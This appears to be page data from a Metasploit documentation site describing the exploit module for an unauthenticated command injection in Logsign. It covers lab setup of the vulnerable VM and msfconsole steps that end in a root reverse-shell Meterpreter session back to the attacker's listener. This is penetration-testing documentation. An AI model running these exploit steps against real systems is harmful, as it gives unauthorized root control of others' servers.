{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/logsign_exec","result":{"data":{"moduleMetadataJson":{"id":"12cee4f3-8359-546b-9dd7-5216d61da239","name":"Logsign Remote Command Injection","fullname":"exploit/linux/http/logsign_exec","description":"This module exploits a command injection vulnerability in Logsign.\n        By exploiting this vulnerability, unauthenticated users can execute\n        arbitrary code under the root user.\n\n        Logsign has a publicly accessible endpoint. That endpoint takes a user\n        input and then use it during operating system command execution without\n        proper validation.\n\n        This module was tested against 4.4.2 and 4.4.137 versions.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/logsign_exec","documentationSlug":"/modules/documentation/exploit/linux/http/logsign_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Download the vulnerable version of OVA or ISO file from following URL. I strongly suggest you to choose OVA.</p>\n<p><a href=\"http://s3-eu-west-1.amazonaws.com/innotim/Logsign.ova\">http://s3-eu-west-1.amazonaws.com/innotim/Logsign.ova</a>\n<a href=\"http://s3-eu-west-1.amazonaws.com/innotim/forest-4.4.1-12.04.iso\">http://s3-eu-west-1.amazonaws.com/innotim/forest-4.4.1-12.04.iso</a></p>\n<h3 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h3>\n<ol>\n<li>Open OVA file with your preferred virtualisation application.</li>\n<li>Before starting the virtual machine, choose NAT mode for interface.</li>\n<li>\n<p>Once the machine started, you must be seeing following information on screen.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Ubuntu 12.04.05 LTS - logsign customer tty1\nIP: 12.0.0.10\n...\nVersion: Focus\n4.4.2 </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>Access the management interface by visiting <code class=\"language-text\">https://&lt;ip_address&gt;</code> through your browser.</li>\n<li>Complete the installation by just submitting the fake data. </li>\n</ol>\n<p><strong>Please follow below instructions if you are seeing different IP address on the screen that doesn't belong to your NAT network range.</strong></p>\n<p>Right after step 3, I've started to see totally different IP address on the screen which was something like 10.0.0.X. Since there is no such a network range in my configuration, it's impossible access to the machine through network. Here is the steps that shows how you can fix this issue. Follow these instructions and then go back to the step 5.</p>\n<ol>\n<li>Reboot the machine</li>\n<li>Start pressing <code class=\"language-text\">shift</code> button at the very beginning and keep pressing until you see GRUB menu.</li>\n<li>Choose second line and press enter. We are going to about boot machine with recovery mode.</li>\n<li>\n<p>You must be seeing terminal right now. Execute following commands.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">mount -rw -o remount /</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>Execute following command specify a new password for root user.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">passwd root</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>As a final step, reboot the machine.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">reboot</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>Login with your root user.</li>\n<li>\n<p>Open <code class=\"language-text\">/etc/network/interfaces</code> file and perform necessary changes. Here is my own configuration. </p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">address 12.0.0.10\nnetmask 255.255.255.0\n&lt;removed line starting with &#39;network&#39;&gt;\n&lt;removed line starting with &#39;broadcast&#39;&gt;\ngateway 12.0.0.2\ndns-nameservers 8.8.8.8</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>Reboot the machine for a last time.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the software as documented above</li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/linux/http/logsign_exec</code></li>\n<li><code class=\"language-text\">set rhost 12.0.0.10</code></li>\n<li><code class=\"language-text\">python/meterpreter/reverse_tcp</code> is configured as a default payload. Change it if you need. Most of the case, you're okay go with default payload type.</li>\n<li><code class=\"language-text\">set LHOST 12.0.0.1</code></li>\n<li><code class=\"language-text\">check</code> and validate that you are seeing following output.</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[+] 12.0.0.10:80 The target is vulnerable.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<ol start=\"9\">\n<li>Here you go. Type <code class=\"language-text\">exploit</code> and hit the enter.</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] Delivering payload...\n[*] Sending stage (38651 bytes) to 12.0.0.10\n[*] Meterpreter session 2 opened (12.0.0.1:4444 -&gt; 12.0.0.10:46057) at 2017-02-28 14:11:20 +0100\n\nmeterpreter &gt; getuid\nServer username: root\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"12cee4f3-8359-546b-9dd7-5216d61da239"}}}